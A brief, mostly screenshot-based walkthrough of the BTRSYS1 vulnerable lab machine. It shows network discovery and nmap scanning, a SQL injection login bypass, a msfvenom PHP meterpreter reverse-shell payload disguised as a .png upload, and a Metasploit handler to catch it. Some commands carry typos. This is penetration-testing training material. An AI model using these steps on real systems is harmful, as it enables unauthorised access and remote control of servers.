# BTRisk BTRSYS1 Walkthrough


```
netdiscover -r 192.168.56.0\24
nmap -sV -O 192.168.56.103
```

![image](../images/post4/1.jpg)

![image](../images/post4/2.jpg)

![image](../images/post4/3.jpg)

![image](../images/post4/4.jpg)

> DENEME@btrisk.com:DENEME

![image](../images/post4/5.jpg)


> ‘ OR 1=1– @btrisk.com:DENEME


![image](../images/post4/6.jpg)


![image](../images/post4/7.jpg)


```
msfvenom -p php/meterpreter/reverse_tcp LHOST:192.168.56.102 LPORT:4545 -o shell.php.png
```


![image](../images/post4/8.jpg)

![image](../images/post4/9.jpg)




![image](../images/post4/10.jpg)
```
use exploit/multi/handler
set payload php/meterpreter/reverse_tcp
set LHOST 192.168.56.102
setLPORT 4545
exploit
```

![image](../images/post4/11.jpg)

![image](../images/post4/12.jpg)

![image](../images/post4/13.jpg)

![image](../images/post4/14.jpg)
